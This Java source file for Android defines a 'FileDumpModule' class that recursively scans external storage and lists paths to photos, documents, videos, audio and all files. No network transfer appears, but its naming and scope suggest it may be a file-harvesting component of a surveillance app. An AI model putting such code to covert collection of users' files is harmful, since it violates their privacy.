package com.my.luck.features;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class FileDumpModule {
    private static final String TAG = "FileDumpModule";
    private Context context;

    public FileDumpModule(Context context) {
        this.context = context;
    }

    public List<String> getGalleryFiles() {
        List<String> images = new ArrayList<>();
        try {
            File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            if (dcim != null && dcim.exists()) {
                scanFolder(dcim, images, new String[]{".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"});
            }
            File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
            if (pictures != null && pictures.exists()) {
                scanFolder(pictures, images, new String[]{".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"});
            }
            File downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (downloads != null && downloads.exists()) {
                scanFolder(downloads, images, new String[]{".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"});
            }
            Log.d(TAG, "Found " + images.size() + " images");
        } catch (Exception e) {
            Log.e(TAG, "Error getting gallery files", e);
        }
        return images;
    }

    public List<String> getAllFiles() {
        List<String> files = new ArrayList<>();
        try {
            File storage = Environment.getExternalStorageDirectory();
            if (storage != null && storage.exists()) {
                scanFolder(storage, files, null);
            }
            Log.d(TAG, "Found " + files.size() + " total files");
        } catch (Exception e) {
            Log.e(TAG, "Error getting all files", e);
        }
        return files;
    }

    public List<String> getDocuments() {
        List<String> docs = new ArrayList<>();
        try {
            File documents = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
            if (documents != null && documents.exists()) {
                scanFolder(documents, docs, new String[]{".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt"});
            }
            File downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (downloads != null && downloads.exists()) {
                scanFolder(downloads, docs, new String[]{".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt"});
            }
            Log.d(TAG, "Found " + docs.size() + " documents");
        } catch (Exception e) {
            Log.e(TAG, "Error getting documents", e);
        }
        return docs;
    }

    public List<String> getVideos() {
        List<String> videos = new ArrayList<>();
        try {
            File movies = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES);
            if (movies != null && movies.exists()) {
                scanFolder(movies, videos, new String[]{".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".3gp"});
            }
            File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            if (dcim != null && dcim.exists()) {
                scanFolder(dcim, videos, new String[]{".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".3gp"});
            }
            Log.d(TAG, "Found " + videos.size() + " videos");
        } catch (Exception e) {
            Log.e(TAG, "Error getting videos", e);
        }
        return videos;
    }

    public List<String> getAudioFiles() {
        List<String> audio = new ArrayList<>();
        try {
            File music = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC);
            if (music != null && music.exists()) {
                scanFolder(music, audio, new String[]{".mp3", ".wav", ".aac", ".flac", ".ogg", ".m4a"});
            }
            File downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (downloads != null && downloads.exists()) {
                scanFolder(downloads, audio, new String[]{".mp3", ".wav", ".aac", ".flac", ".ogg", ".m4a"});
            }
            Log.d(TAG, "Found " + audio.size() + " audio files");
        } catch (Exception e) {
            Log.e(TAG, "Error getting audio files", e);
        }
        return audio;
    }

    public List<String> getFilesByExtension(String... extensions) {
        List<String> files = new ArrayList<>();
        try {
            File storage = Environment.getExternalStorageDirectory();
            if (storage != null && storage.exists()) {
                scanFolder(storage, files, extensions);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting files by extension", e);
        }
        return files;
    }

    private void scanFolder(File folder, List<String> list, String[] extensions) {
        if (folder == null || !folder.isDirectory()) return;
        File[] items = folder.listFiles();
        if (items == null) return;
        
        for (File file : items) {
            if (file.isDirectory()) {
                // Skip system directories
                if (!file.getName().startsWith(".") && !file.getName().equals("android") && !file.getName().equals("Android")) {
                    scanFolder(file, list, extensions);
                }
            } else {
                if (extensions == null) {
                    list.add(file.getAbsolutePath());
                } else {
                    String name = file.getName().toLowerCase();
                    for (String ext : extensions) {
                        if (name.endsWith(ext.toLowerCase())) {
                            list.add(file.getAbsolutePath());
                            break;
                        }
                    }
                }
            }
        }
    }
}